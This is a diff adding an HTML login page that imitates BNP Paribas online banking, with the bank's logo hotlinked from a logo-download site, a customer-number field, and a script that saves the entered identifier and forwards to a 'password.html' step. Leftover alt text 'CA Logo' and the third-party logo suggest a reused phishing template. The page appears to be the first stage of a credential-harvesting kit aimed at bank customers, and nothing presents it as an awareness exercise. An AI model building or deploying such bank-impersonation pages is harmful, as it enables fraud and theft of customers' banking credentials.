@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion espace client - BNP Paribas Italia</title>
+
+  <!-- Tailwind CSS & FontAwesome -->
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <style>
+    body { font-family: 'Plus Jakarta Sans', sans-serif; }
+  </style>
+</head>
+<body class="bg-slate-100 min-h-screen flex flex-col justify-between text-slate-800">
+<link rel="shortcut icon" href="https://lh3.googleusercontent.com/48IHZd1EHIk-Dg1m6J36FZ6Pnlz0oLHVdqkzNdS8xJPCVdQk3EgZa014nPNzwi7o918
+
+" />
+  <!-- En-tête -->
+  <header class="bg-white border-b border-slate-200 shadow-xs">
+    <div class="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
+      <div class="flex items-center space-x-3">
+        <div class="w-10 h-10 bg-[] rounded-lg flex items-center justify-center text-white font-bold text-xl shadow-xs">
+          <span></span>
+        </div>
+        <span class="font-bold text-lg tracking-tight text-slate-800">
+          <img src="https://wp.logos-download.com/wp-content/uploads/2016/04/BNP_Paribas_logo_logotype_emblem.png?dl" height="135" width="175" alt="CA Logo">
+        </span>
+      </div>
+      <nav class="hidden md:flex space-x-6 text-sm font-medium text-slate-600">
+        <a href="#" class="text-[#056846] font-semibold border-b-2 border-[#056846] pb-1">Particuliers</a>
+        <a href="#" class="hover:text-slate-900 transition">Entreprises</a>
+        <a href="#" class="hover:text-slate-900 transition">Professionnels</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Conteneur principal -->
+  <main class="flex-1 flex items-center justify-center p-4 my-8">
+    <div class="bg-white border border-slate-200 rounded-2xl shadow-lg p-6 md:p-8 max-w-md w-full">
+      
+      <div class="text-center mb-6">
+        <h1 class="text-2xl font-bold text-slate-900">Accédez à votre espace client</h1>
+        <p class="text-sm text-slate-500 mt-1">Saisissez votre identifiant pour continuer</p>
+      </div>
+
+      <form id="step1Form" class="space-y-5">
+        
+        <!-- Champ Identifiant -->
+        <div>
+          <label for="ident" class="block text-sm font-semibold text-slate-700 mb-1">Numéro Client / Identifiant</label>
+          <div class="relative">
+            <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-slate-400">
+              <i class="fa-solid fa-user"></i>
+            </span>
+            <input 
+              type="text" 
+              id="ident" 
+              name="ident" 
+              maxlength="50" 
+              autocomplete="off" 
+              placeholder="Saisissez votre identifiant" 
+              class="w-full pl-10 pr-10 py-2.5 bg-slate-50 border border-slate-300 rounded-xl text-slate-800 placeholder-slate-400 focus:outline-none focus:border-[#056846] focus:ring-2 focus:ring-[#056846]/20 transition text-sm"
+              required
+            >
+            <button type="button" id="clearInput" class="hidden absolute inset-y-0 right-0 flex items-center pr-3 text-slate-400 hover:text-slate-600">
+              <i class="fa-solid fa-circle-xmark"></i>
+            </button>
+          </div>
+        </div>
+
+        <!-- Mémoriser mon identifiant -->
+        <div class="flex items-center">
+          <input id="remember_me" type="checkbox" name="cookie" class="w-4 h-4 text-[#056846] border-slate-300 rounded focus:ring-[#056846]">
+          <label for="remember_me" class="ml-2 text-sm text-slate-600 cursor-pointer">Mémoriser mon numéro client</label>
+        </div>
+
+        <!-- Bouton Continuer -->
+        <button 
+          type="submit" 
+          class="w-full bg-[#056846] hover:bg-emerald-800 text-white font-semibold py-3 rounded-xl transition shadow-md shadow-[#056846]/20 flex items-center justify-center space-x-2 cursor-pointer"
+        >
+          <span>Continuer</span>
+          <i class="fa-solid fa-arrow-right text-xs"></i>
+        </button>
+      </form>
+
+      <div class="mt-6 text-center">
+        <a href="#" class="text-xs text-[#056846] hover:underline font-semibold">Identifiant ou code secret oublié ?</a>
+      </div>
+
+    </div>
+  </main>
+
+  <footer class="bg-white border-t border-slate-200 py-4 text-center text-xs text-slate-500">
+    <p>&copy; BNP Paribas - Tous droits réservés.</p>
+  </footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const identInput = document.getElementById('ident');
+      const clearBtn = document.getElementById('clearInput');
+      const step1Form = document.getElementById('step1Form');
+
+      // Pré-remplir si un identifiant était déjà enregistré
+      const savedIdent = sessionStorage.getItem('activeUserIdent');
+      if (savedIdent) {
+        identInput.value = savedIdent;
+        clearBtn.classList.remove('hidden');
+      }
+
+      // Bouton pour effacer le champ
+      identInput.addEventListener('input', () => {
+        if (identInput.value.length > 0) {
+          clearBtn.classList.remove('hidden');
+        } else {
+          clearBtn.classList.add('hidden');
+        }
+      });
+
+      clearBtn.addEventListener('click', () => {
+        identInput.value = '';
+        clearBtn.classList.add('hidden');
+        identInput.focus();
+      });
+
+      // Validation et passage à la page 2
+      step1Form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const identValue = identInput.value.trim();
+        if (identValue) {
+          sessionStorage.setItem('activeUserIdent', identValue);
+          window.location.href = "password.html";
+        }
+      });
+    });
+  </script>
+</body>
+</html>
